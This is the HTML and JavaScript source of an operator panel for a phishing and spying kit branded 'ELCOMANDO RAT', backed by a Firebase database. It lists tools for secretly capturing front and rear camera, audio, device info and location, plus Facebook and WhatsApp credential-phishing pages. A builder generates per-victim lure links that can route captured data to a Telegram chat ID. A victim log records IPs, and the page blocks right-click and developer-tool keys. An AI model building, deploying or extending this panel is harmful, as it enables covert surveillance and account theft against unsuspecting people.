<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RAT | Elcomando & Princess v¬≥</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        @import url( https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Noto+Kufi+Arabic:wght@400;700&display=swap );
        
        :root {
            --primary: #00f2ff;
            --bg: #050505;
            --surface: rgba(15, 15, 15, 0.98);
            --neon-glow: 0 0 15px rgba(0, 242, 255, 0.5);
            --admin-red: #ff1a1a;
        }

        body, html { margin: 0; padding: 0; background: var(--bg); color: white; font-family:  Noto Kufi Arabic , sans-serif; overflow: hidden; height: 100vh; }

        #admin-broadcast {
            display: none; background: linear-gradient(90deg, var(--admin-red), #8b0000);
            color: white; padding: 10px; text-align: center; font-size: 11px;
            position: fixed; top: 0; width: 100%; z-index: 1001;
            box-shadow: 0 5px 15px rgba(255, 26, 26, 0.3);
        }

        #page-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 9999;
            display: none; align-items: center; justify-content: center; flex-direction: column;
        }
        .spinning-emoji { font-size: 70px; animation: rotate 1s infinite linear; filter: drop-shadow(0 0 15px var(--primary)); }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .custom-dialog-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
            display: none; align-items: center; justify-content: center; z-index: 10000;
        }
        .custom-dialog-box {
            width: 85%; max-width: 320px; background: #0a0a0a;
            border: 2px solid var(--primary); border-radius: 20px;
            padding: 25px; text-align: center; box-shadow: var(--neon-glow);
        }

        .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; }
        .header h1 { font-family:  Orbitron ; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }

        .viewport { margin-top: 75px; height: calc(100vh - 165px); overflow-y: auto; padding: 15px; }
        .page { display: none; }
        .page.active { display: block; animation: zoomIn 0.3s ease; }
        @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }

        .links-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .tool-card { 
            background: var(--surface); border: 1px solid #1a1a1a; border-right: 4px solid var(--primary);
            padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s;
        }
        
        input, select { width: 100%; background: #000; border: 1px solid var(--primary); padding: 14px; border-radius: 10px; color: white; margin-bottom: 10px; text-align: center; box-sizing: border-box; outline: none; }
        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; }

        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 90px; background: #000; border-top: 2px solid var(--primary); display: flex; align-items: center; justify-content: space-around; z-index: 1000; }
        .nav-item { color: #444; text-align: center; flex: 1; font-size: 10px; cursor: pointer; }
        .nav-item i { font-size: 20px; margin-bottom: 5px; }
        .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
    </style>
</head>
<body>

    <div id="admin-broadcast"><i class="fas fa-bullhorn"></i> <span id="broadcast-text"></span></div>

    <div id="page-loader">
        <div class="spinning-emoji">‚öôÔ∏è</div>
        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">AUTHENTICATING...</p>
    </div>

    <div id="custom-alert" class="custom-dialog-overlay">
        <div class="custom-dialog-box">
            <div id="alert-icon" style="font-size:40px; margin-bottom:10px;">‚ö†Ô∏è</div>
            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">SYSTEM</h3>
            <p id="alert-msg" style="font-size: 14px; color: #ccc;"></p>
            <button class="btn" onclick="closeAlert()">ŸÅŸáŸÖÿ™ üëç</button>
        </div>
    </div>

    <div id="auth-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
        <div class="tool-card" style="width: 100%; max-width: 350px; border-right: none; border-top: 4px solid var(--primary);">
            <i class="fas fa-skull fa-3x" style="color:var(--primary); margin-bottom: 15px;"></i>
            <div id="login-box">
                <input type="text" id="loginUser" placeholder="Username">
                <input type="password" id="loginPass" placeholder="Password">
                <button class="btn" onclick="handleAuth( login )">LOGIN üîì</button>
                <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">CREATE ACCOUNT</p>
            </div>
            <div id="signup-box" style="display: none;">
                <input type="text" id="regUser" placeholder="New Username">
                <input type="password" id="regPass" placeholder="New Password">
                <button class="btn" onclick="handleAuth( signup )">SIGN UP üõ†Ô∏è</button>
                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">HAVE ACCOUNT?</p>
            </div>
        </div>
    </div>

    <div id="main-panel" style="display: none;">
        <header class="header">
            <h1 id="title">ELCOMANDO RAT</h1>
            <i class="fas fa-ghost" style="color: var(--primary);"></i>
        </header>

        <div class="viewport">
            <div id="tab1" class="page active">
                <div class="links-grid" id="main-grid"></div>
            </div>

            <div id="tool-details-page" class="page">
                <div class="tool-card" style="height: 250px; overflow-y: auto; text-align: right;" id="victim-list"></div>
                <div style="margin-top: 20px; text-align: center;">
                    <p id="tool-link-display" style="font-size: 10px; color: var(--primary); word-break: break-all;"></p>
                    <button class="btn" id="copy-tool-btn">COPY TOOL LINK üìã</button>
                    <button class="btn" style="margin-top:10px; background:#222; color:#fff;" onclick="nav(1,  TOOLS ,  üîó , null)">BACK</button>
                </div>
            </div>

            <div id="tab2" class="page">
                <div class="tool-card">
                    <h3>BUILDER</h3>
                    <select id="tool-select"></select>
                    <input type="text" id="victim-name" placeholder="Victim Name">
                    <button class="btn" onclick="generateCustomLink()">GENERATE üöÄ</button>
                    <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary);">
                        <span id="final-link" style="font-size:10px;"></span><br><br>
                        <button class="btn" onclick="copyGeneratedLink()">COPY üìã</button>
                    </div>
                </div>
            </div>

            <div id="tab3" class="page">
                <div class="tool-card" id="notifs-list">No logs available.</div>
            </div>

            <div id="tab4" class="page">
                <div class="tool-card">
                    <h2 id="set-username" style="color: var(--primary);">User</h2>
                    <button class="btn" style="background: var(--admin-red);" onclick="logout()">LOGOUT üö™</button>
                </div>
            </div>
        </div>

        <nav class="bottom-nav">
            <div class="nav-item active" onclick="nav(1,  TOOLS ,  üîó , this)"><i class="fas fa-link"></i><br>TOOLS</div>
            <div class="nav-item" onclick="nav(2,  BUILDER ,  üõ†Ô∏è , this)"><i class="fas fa-hammer"></i><br>BUILDER</div>
            <div class="nav-item" onclick="nav(3,  LOGS ,  üîî , this)"><i class="fas fa-bell"></i><br>LOGS</div>
            <div class="nav-item" onclick="nav(4,  PROFILE ,  ‚öôÔ∏è , this)"><i class="fas fa-user-shield"></i><br>PROFILE</div>
        </nav>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const tools = [
            { name: "ŸÉÿßŸÖŸäÿ±ÿß ÿßŸÖÿßŸÖŸä", value: "fcam", icon: "fas fa-camera" },
            { name: "ŸÉÿßŸÖŸäÿ±ÿß ÿÆŸÑŸÅŸä", value: "rcam", icon: "fas fa-video" },
            { name: "ŸÉÿßŸÖŸäÿ±ÿß ŸÖÿπ ÿµŸàÿ™", value: "vcam", icon: "fas fa-microphone" },
            { name: "ŸÖÿπŸÑŸàŸÖÿßÿ™ Ÿáÿßÿ™ŸÅ", value: "info", icon: "fas fa-mobile-alt" },
            { name: "ŸÖŸàŸÇÿπ", value: "loc", icon: "fas fa-map-marker-alt" },
            { name: "Facebook", value: "fb", icon: "fab fa-facebook" },
            { name: "WhatsApp", value: "wa", icon: "fab fa-whatsapp" }
        ];

        // --- ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ®ÿßÿ™ ŸàÿßŸÑÿØÿÆŸàŸÑ ---
        async function handleAuth(type) {
            const u = (type ===  signup  ? document.getElementById( regUser ) : document.getElementById( loginUser )).value.trim();
            const p = (type ===  signup  ? document.getElementById( regPass ) : document.getElementById( loginPass )).value.trim();
            if(!u || !p) return showAlert("‚ö†Ô∏è", "Ÿäÿ±ÿ¨Ÿâ ŸÖŸÑÿ° ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™");

            document.getElementById( page-loader ).style.display =  flex ;
            const snap = await db.ref( users/  + u).once( value );

            if(type ===  signup ) {
                if(snap.exists()) { showAlert("‚ùå", "ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖŸàÿ¨ŸàÿØ ÿ®ÿßŸÑŸÅÿπŸÑ"); }
                else {
                    await db.ref( users/  + u).set({ password: p, status:  active , private_msg: { text: "", seen: true } });
                    showAlert("‚úÖ", "ÿ™ŸÖ ÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑÿ≠ÿ≥ÿßÿ®ÿå ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿØÿÆŸàŸÑ");
                    toggleAuth(false);
                }
            } else {
                if(snap.exists() && snap.val().password === p) {
                    localStorage.setItem( logged_user , u);
                    enterSystem();
                } else { showAlert("üö´", "ÿ®ŸäÿßŸÜÿßÿ™ ÿÆÿßÿ∑ÿ¶ÿ©"); }
            }
            document.getElementById( page-loader ).style.display =  none ;
        }

        // --- ÿØÿÆŸàŸÑ ÿßŸÑŸÜÿ∏ÿßŸÖ Ÿàÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿßÿØÿßÿ±ÿßÿ™ ---
        function enterSystem() {
            const user = localStorage.getItem( logged_user );
            if(!user) return;

            document.getElementById( auth-screen ).style.display =  none ;
            document.getElementById( main-panel ).style.display =  block ;
            document.getElementById( set-username ).innerText = user;

            initGrid();
            checkBanStatus(user);
            watchPrivateMessages(user);
            listenToGlobalBroadcast();
        }

        function initGrid() {
            const grid = document.getElementById( main-grid );
            const select = document.getElementById( tool-select );
            grid.innerHTML = ""; select.innerHTML = "";
            tools.forEach(t => {
                grid.innerHTML += `<div class="tool-card" onclick="openToolPage( ${t.value} )"><i class="${t.icon}"></i><br>${t.name}</div>`;
                select.innerHTML += `<option value="${t.value}">${t.name}</option>`;
            });
        }

        // --- ÿ±ÿßÿØÿßÿ±ÿßÿ™ ÿßŸÑÿ£ŸÖÿßŸÜ ŸàÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ---
        function checkBanStatus(u) {
            db.ref( users/  + u +  /status ).on( value , snap => {
                if(snap.val() ===  banned ) {
                    alert("üö´ ÿ™ŸÖ ÿ≠ÿ∏ÿ±ŸÉ ŸÖŸÜ ÿßŸÑŸÖŸÜÿµÿ©");
                    logout();
                }
            });
        }

        function watchPrivateMessages(u) {
            db.ref( users/  + u +  /private_msg ).on( value , snap => {
                if(snap.exists() && !snap.val().seen) {
                    showAlert("üì© ÿ±ÿ≥ÿßŸÑÿ© ÿÆÿßÿµÿ©", snap.val().text);
                    db.ref( users/  + u +  /private_msg/seen ).set(true);
                }
            });
        }

        function listenToGlobalBroadcast() {
            db.ref( global_notifications ).on( value , snap => {
                const bar = document.getElementById( admin-broadcast );
                if(snap.exists()) {
                    document.getElementById( broadcast-text ).innerText = snap.val().text;
                    bar.style.display =  block ;
                } else { bar.style.display =  none ; }
            });
        }

        // --- Ÿàÿ∏ÿßÿ¶ŸÅ ÿßŸÑÿ£ÿØŸàÿßÿ™ ŸàÿßŸÑŸÖŸÜÿ¥ÿ¶ ---
        async function openToolPage(val) {
            const user = localStorage.getItem( logged_user );
            const baseUrl = window.location.origin;
            const link = `${baseUrl}/${val}.html?user_id=${user}`;
            
            document.getElementById( tool-link-display ).innerText = link;
            document.getElementById( copy-tool-btn ).onclick = () => {
                navigator.clipboard.writeText(link);
                showAlert("‚úÖ", "ÿ™ŸÖ ŸÜÿ≥ÿÆ ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ£ÿØÿßÿ©");
            };

            const toolName = tools.find(t => t.value === val).name;
            nav( tool , toolName,  ‚öôÔ∏è , null);
            loadVictims(val, user);
        }

        function loadVictims(tool, user) {
            db.ref( hits/  + user +  /  + tool).on( value , snap => {
                const list = document.getElementById( victim-list );
                list.innerHTML = snap.exists() ? "" : "No victims yet.";
                snap.forEach(c => {
                    list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px;">üì° IP: ${c.val().ip} | ${c.val().time}</div>`;
                });
            });
        }

        function generateCustomLink() {
            const tool = document.getElementById( tool-select ).value;
            const vict = document.getElementById( victim-name ).value || "target";
            const user = localStorage.getItem( logged_user );
            const liveTools = ["fcam", "rcam", "vcam", "loc", "info"];
            
            let finalId = user;
            if(liveTools.includes(tool)) {
                const tid = prompt("ÿ£ÿØÿÆŸÑ Chat ID ÿßŸÑÿ™ŸÑŸäÿ¨ÿ±ÿßŸÖ:");
                if(!tid) return;
                finalId = tid;
            }

            const link = `${window.location.origin}/${tool}.html?user_id=${finalId}&target=${vict}`;
            document.getElementById( final-link ).innerText = link;
            document.getElementById( generated-result ).style.display =  block ;
        }

        // --- ÿØŸàÿßŸÑ ÿπÿßŸÖÿ© ---
        function nav(id, title, emoji, el) {
            if(el) {
                document.querySelectorAll( .nav-item ).forEach(n => n.classList.remove( active ));
                el.classList.add( active );
            }
            document.querySelectorAll( .page ).forEach(p => p.classList.remove( active ));
            const target = id ===  tool  ?  tool-details-page  :  tab  + id;
            document.getElementById(target).classList.add( active );
            document.getElementById( title ).innerText = title;
        }

        function showAlert(t, m) {
            document.getElementById( alert-title ).innerText = t;
            document.getElementById( alert-msg ).innerText = m;
            document.getElementById( custom-alert ).style.display =  flex ;
        }
        function closeAlert() { document.getElementById( custom-alert ).style.display =  none ; }
        function toggleAuth(s) {
            document.getElementById( login-box ).style.display = s ?  none  :  block ;
            document.getElementById( signup-box ).style.display = s ?  block  :  none ;
        }
        function logout() { localStorage.clear(); location.reload(); }
        function copyGeneratedLink() {
            navigator.clipboard.writeText(document.getElementById( final-link ).innerText);
            showAlert("‚úÖ", "ÿ™ŸÖ ÿßŸÑŸÜÿ≥ÿÆ ÿ®ŸÜÿ¨ÿßÿ≠");
        }

        window.onload = () => { if(localStorage.getItem( logged_user )) enterSystem(); };

        // ÿ≠ŸÖÿßŸäÿ© ÿ®ÿ≥Ÿäÿ∑ÿ©
        document.oncontextmenu = () => false;
        document.onkeydown = e => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
    </script>
</body>
</html>

